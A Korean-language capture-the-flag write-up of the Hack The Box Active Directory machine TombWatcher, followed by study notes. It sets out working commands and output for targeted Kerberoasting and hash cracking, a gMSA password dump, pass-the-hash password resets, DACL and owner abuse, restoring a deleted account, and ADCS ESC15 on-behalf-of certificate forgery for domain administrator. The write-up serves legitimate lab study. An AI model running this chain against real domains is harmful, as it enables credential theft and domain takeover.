# HTB-TOMBWATCHER
```bash
OS: Windows(AD)
DATE: 26.11.5
DIFFICULTY: Medium
```

## RECON
초기 접근 전 henry / H3nry_987TGV! 라는 크레덴셜을 얻고 시작하였다. 이후 nmap을 통해 전체 포트 검사와 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49695,49696,49698,49717,56570,56585 IP | tee nmap
```
포트 검사 결과 88, 389 등의 서비스가 있는 것으로 보아 AD DC 서버인 것 같았다. 따라서 초기에 얻은 자격증명으로 먼저 bloodhound를 돌리고 SMB 열거를 진행하였다.
```bash
bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns IP -c all
```
```bash
bloodhound-start
```

## Initial Access
먼저 bloodhound의 outbound를 확인해 주었다.

![blood](attach_real/Pasted%20image%2020261105192204.png)

확인 결과 henry 유저와 alfred 유저가 writeSPN 관계인 것을 알게 되어, targetedKerberoast 도구를 이용하여 kerberoast hash를 추출하였다.
```bash
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' 

[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$60be73a58fa080c9fd21d7337152d603$2f51ed0d573ae69e0e4d14681f530c2119d50d1bb7ed76881b7b149909e716f912a8c5e5dc327ee94a8f70e2b9d4b15835264b2426d56a50e41ba78a0cb1ce86307aac59b661e7e311fe8c7167c6
```
이후 hashcat을 사용하여 crack해 주었다.
```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```
이로써 alfred 유저의 평문 크레덴셜을 얻게 되었고, 다음으로 alfred 유저와 INFRASTRUCTURE 그룹이 AddSelf 관계이기 때문에 bloodyAD 도구를 활용하여 그룹에 추가해 주었다.
```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u Alfred -p basketball add groupMember INFRASTRUCTURE Alfred

[+] Alfred added to INFRASTRUCTURE
```
```bash
net rpc group members "INFRASTRUCTURE" -U "tombwatcher.htb"/"Alfred"%"basketball" -S "dc01.tombwatcher.htb"

TOMBWATCHER\Alfred
```
이제 alfred가 대상 그룹에 추가되었다. 이후 대상 그룹은 Ansible이라는 유저와 READGMSAPassword 관계이기 때문에, **gMSADumper.py** 도구를 사용하여 덤프해 주었다.
```bash
python3 gMSADumper.py -u 'Alfred' -p 'basketball' -d 'tombwatcher.htb'

Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::8d5363f881f1bb3bff9b0d64b8b76d7a
ansible_dev$:aes256-cts-hmac-sha1-96:81ce7a272555b7ae9b87fb667fa238cc0e180b4c2705e49b69667519291145da
ansible_dev$:aes128-cts-hmac-sha1-96:f0b4e21a2f5b0d7bebe6136b01bc95af
```
따라서 ansible_dev$ 계정의 NT HASH를 얻게 되어 PTH가 가능해졌다. 이제 SAM 유저와 ForceChangePassword 관계이기 때문에 `pth-net` 도구를 활용하여 abusing을 진행하였다. 다만 NTLM 해시로 인증하는 방식인데 LM 해시는 없기에, **aad3b435b51404eeaad3b435b51404ee**(빈 문자열을 LM 알고리즘으로 해싱한 고정 결과값)를 넣어 인증해 주었다.
```bash
pth-net rpc password "sam" "password" -U "tombwatcher.htb"/"ansible_dev$"%":"aad3b435b51404eeaad3b435b51404ee:8d5363f881f1bb3bff9b0d64b8b76d7a" -S "dc01.tombwatcher.htb"
```
이로써 sam 유저의 패스워드를 password로 바꿔 준 후, sam 유저와 john 유저는 writeOwner 관계이기 때문에 owner를 바꿔준 후 비밀번호를 바꿔 주었다.
```bash
python3 owneredit.py -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'password'  
```
```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'password' -dc-ip IP
```
```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip IP -d tombwatcher.htb -u sam -p 'password' set password john 'JohnPass123!'
```
이로써 john 유저의 크레덴셜까지 얻게 되었고, winrm에 접속하여 user flag까지 추출할 수 있었다.

![user](attach_real/Pasted%20image%2020261105191157.png)

## Privilege Escalation
이제 john 유저를 얻었으니, john 유저와 ADCS OU가 genericAll인 것을 abusing하여 JOHN이 대상 OU의 최고 권한자가 되게 해주었다.
```bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'JohnPass123!'

[*] DACL backed up to dacledit-20261105-194641.bak
[*] DACL modified successfully!
```
이로써 ADCS OU의 모든 컨트롤이 가능해졌다. 하지만 OU에 아무런 유저가 없었다. 따라서 삭제된 유저가 있을 수 있다고 생각했다. 삭제된 객체는 평범한 검색으로는 발견할 수 없기 때문에, ldapsearch + 특수 컨트롤을 사용하여 휴지통 폴더를 직접 지정해 뒤져보았다.
```bash
ldapsearch -x -H ldap://10.129.232.167 -D 'john@tombwatcher.htb' -w 'JohnPass123!' -b 'CN=Deleted Objects,DC=tombwatcher,DC=htb' -E '!1.2.840.113556.1.4.417'

# cert_admin
DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3, Deleted Objects, tombwat
 cher.htb
dn: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Object
 s,DC=tombwatcher,DC=htb
 lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
```
확인 결과 cert_admin이라는 유저가 원래 ADCS 유저였다가 삭제된 것을 알게 되었다. john은 ADCS OU를 장악한 계정이니까, 그 OU로 되돌아올 cert_admin을 복구할 권한이 있다. 먼저 복구를 하려면 cert_admin의 고유 ID인 GUID가 필요했다. 하지만 `objectGUID:: yGkD+KKWf0qlbJwV7dfR4w==` 이런 식으로 GUID 변환 로직으로 인코딩되어 있어, 특수 명령어를 사용하여 디코딩해 주었다.
```python
python3 -c "import uuid,base64; print(uuid.UUID(bytes_le=base64.b64decode('yGkD+KKWf0qlbJwV7dfR4w==')))"

f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
```
변환 결과 대상 유저의 GUID를 얻게 되어 john 쉘에서 복구해 주었다.
```powershell
Restore-ADObject -Identity f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
```
이제 복구했으니 되살린 cert_admin의 비밀번호를 설정해 주었다.
```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip <IP> -d tombwatcher.htb -u john -p 'JohnPass123!' set password cert_admin 'password'
```
이제 복구했으니 로그인이 가능했다. 이제 certipy-ad를 대상 유저로 돌려보았다.
```bash
certipy-ad find -u 'cert_admin@tombwatcher.htb' -p 'password' -dc-ip IP -ns IP -vulnerable -stdout

Certificate Templates                   : [!] Could not find any certificate templates
```
하지만 취약한 템플릿이 나오지 않았다. 따라서 john 유저로 다시 한번 돌려보았다.
```bash
certipy-ad find -u john@tombwatcher.htb -p 'JohnPass123!' -dc-ip IP -ns IP -json -output check

[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
```
똑같이 실패하였다. 하지만 여기서 **S-1-5-21-1392491010-1358638721-2126982587-1111**, 이 SID만 템플릿 신청이 가능하다고 뜬 것을 발견하였다. 따라서 현재 얻은 cert_admin 유저의 SID를 확인해 보았다.
```bash
nxc smb IP -u john -p 'JohnPass123!' --rid-brute | grep -i cert
```
확인해 본 결과 현재 cert_admin의 SID는 1111이 아니라 1109였다. 따라서 진짜 cert_admin이 아니었던 것이다. 알고 보니 휴지통 안에 cert_admin 유저가 3명 있었다. 그중 진짜 cert_admin을 찾아보았다. 따라서 다시 GUID로 복구하는 작업을 반복하였다.
```bash
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```
```bash
bloodyAD --host dc01.tombwatcher.htb --dc-ip <IP> -d tombwatcher.htb -u john -p 'JohnPass123!' set password cert_admin 'password'
```
이제 다시 한번 더 SID를 확인해 보았다.
```bash
nxc smb IP -u john -p 'JohnPass123!' --rid-brute | grep -i cert

SMB                      10.129.232.167  445    DC01             517: TOMBWATCHER\Cert Publishers (SidTypeAlias)
SMB                      10.129.232.167  445    DC01             1111: TOMBWATCHER\cert_admin (SidTypeUser)
```
확인 결과 드디어 진짜 cert_admin을 찾을 수 있었다. 이제 다시 한번 더 certipy-ad find를 돌려보았다.
```bash
certipy-ad find -u 'cert_admin@tombwatcher.htb' -p 'password' -dc-ip IP -ns IP -vulnerable -stdout

[+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
      ESC17                             : Enrollee supplies subject and template allows server authentication.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
      ESC17                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```
이제 진짜 cert_admin으로 돌리니 ESC15 취약점이 있다는 것을 알게 되었다. 이제 exploit을 찾아본 결과 admin으로 신분증 위조를 시도하였다.
```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'password' -dc-ip IP -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
```
이제 NT 해시를 뽑아 보았다.
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip IP

[-] Certificate is not valid for client authentication
[-] Check the certificate template and ensure it has the correct EKU(s)
[-] If you recently changed the certificate template, wait a few minutes for the change to propagate
[-] See the wiki for more information
```
하지만 오류가 났다. 확인한 결과 "이 인증서는 유효하지 않으니 EKU를 확인해라"라는 오류였다. 첫 번째 문제는 EKU(용도)가 제대로 박히지 않은 것이다. `-application-policies 'Client Authentication'`로 로그인용을 주입하려고 하였지만, **WebServer 템플릿의 schema v1 특성 + certipy 처리 방식 때문에** 제대로 반영되지 않았다. 두 번째 문제는 SID가 없었던 것이다. 따라서 우회를 진행했다. **2단계 on-behalf-of 방식**, 즉 "남 대신 신청하기"라는 더 정석적인 방법으로 바꾸었다. 먼저 대리 신청인 인증서를 발급한다.
```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'password' -dc-ip IP -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'

[*] Got certificate without identity 
```
신원은 없지만 대리 신청 자격증을 받게 되었다(cert_admin.pfx). 이제 얻었으니 대리인 자격증으로 administrator 인증서를 신청해 주었다. 차이점은 두 가지이다. -template을 webserver에서 User 템플릿으로 바꿔 사용했다. User 템플릿은 원래부터 로그인용(EKU)이 제대로 들어 있는 양식이다. 그리고 -pfx에 대리인 자격증을 넣어주고, -on-behalf-of 옵션에 administrator를 대신해서(대리로) 이 인증서를 신청한다는 자격을 추가해 주었다.
```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'password' -dc-ip IP -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\administrator'

[*] Saving certificate and private key to 'administrator.pfx'                                                                                                                                
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename):                                                                                      
[*] Wrote certificate and private key to 'administrator_49704167-2b8b-4959-8175-820bfb25bbe0.pfx'
```
시도 결과 `administrator_49704167-2b8b-4959-8175-820bfb25bbe0.pfx`, 이번엔 SID까지 박혀 있는 진짜 pfx를 받게 되어, 대상 pfx로 NTLM 해시를 추출해 보았다.
```bash
certipy-ad auth -pfx 'administrator_49704167-2b8b-4959-8175-820bfb25bbe0.pfx' -dc-ip IP
```
이제 NT hash를 얻었으니 PTH를 사용하여 winrm으로 접속하였다. 접속 후 root 플래그를 얻을 수 있었다.

![root](attach_real/Pasted%20image%2020261105191102.png)

## New Inform
- gMSADumper는 이름 그대로 gMSA의 패스워드를 덤프하는 도구
- gMSA는 그룹 관리 서비스 계정
- gMSA 덤프된 값들은 NT hash이다. 그 밑의 값들은 kerberos 인증용 aes key (aeskey for kerberos authentication)
- NTLM 인증할 때 LM이 없을 때 채우는 방법은 두 가지. 첫 번째는 LM 자리를 비우고 콜론만 두는 방식(`:NT`), 두 번째는 빈 LM 해시의 고정값으로 채우는 방식(`aad3b435b51404eeaad3b435b51404ee:NT`). 뒤의 값은 빈 문자열을 LM 알고리즘으로 해싱한 고정 결과값
- dn을 입력할 때 bloodhound의 Distinguished Name을 참고하자
- 만약 OU 최고 권한을 얻었는데 아무런 유저가 없으면 휴지통을 살펴보자
- LDAP을 통해서 휴지통을 뒤질 때 `-E '!1.2.840.113556.1.4.417'` 이와 같은 특수 컨트롤이 꼭 있어야 한다
- 만약 어떤 객체의 최고 권한을 가지고 있으면 삭제된 유저를 복귀시킬 수 있다. 복귀시킬 때 필요한 건 유저의 GUID
- 유저의 GUID는 base64 그리고 GUID 변환 로직으로 인코딩되어 있다. 디코딩하려면 `python3 -c "import uuid,base64; print(uuid.UUID(bytes_le=base64.b64decode('yGkD+KKWf0qlbJwV7dfR4w==')))"` 이와 같이 디코딩할 수 있다
- 만약 삭제된 유저를 복구시켜 주었다면, 최고 권한자이기 때문에 복귀시킨 유저의 비밀번호를 다시 설정해 줄 수 있다
- 특정 템플릿으로 신청할 수 있는 SID는 정해져 있다
- 만약 템플릿이 보이지 않으면 내가 맞는 SID인지 확인하자. ex: 새로운 유저로 find를 돌려보면 오류에 SID가 나올 수 있다
- 이름이 같은 cert_admin이라도 AD에서는 객체를 GUID로 구분한다. 이때 RID가 다를 수 있기 때문에, 같은 이름의 유저가 여러 명일 때는 꼭 확인해 주자
- ESC15란: Web Server 신분증은 웹서버용이지 사람 로그인용이 아니다. 근데 이 webserver 양식이 너무 구형이라는 결함이 있었다. 즉 웹서버용에 "이거 사람 로그인용으로 사용해달라"고 끼워 넣으면 신분증 위조가 가능하다
- 만약 exploit 과정에서 `Certificate is not valid for client authentication`이 뜨면, 발급은 됐는데 로그인 용도(EKU)가 제대로 안 박힌 것이니 대리 신청으로 우회할 수 있다
- on-behalf-of: 내 권한으로 다른 사람 이름의 인증서를 대신 발급받는 것. 만약 공격자가 **Enrollment Agent** 권한을 손에 넣으면, administrator 본인의 인증서를 발급받고 그걸로 admin으로 로그인하여 도메인을 장악할 수 있는 악용
- 대리 인증 방법: 1. `certipy-ad req ... -template 'WebServer' -application-policies 'Certificate Request Agent'` — **Certificate Request Agent** = "대리 신청인" 용도. 그러면 유저의 pfx가 나옴. 이후 2. `certipy-ad req ... -template 'User' -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\administrator'` — 그 자격으로 administrator 대신 신청. **-template 'User'** -> administrator가 받을 인증서는 정상 User 양식으로, **-pfx 'cert_admin.pfx'** -> "나 대리인 자격증 있어요", **-on-behalf-of 'tombwatcher\administrator'** -> administrator를 대신해서 신청. 이런 식으로 우회가 가능하다
- 언제 우회하나: **템플릿 EKU**에 **Client Authentication**이 있으면 그냥 -upn 방법으로 할 수 있다. 없으면 로그인이 불가능하고 대리 신청이 필요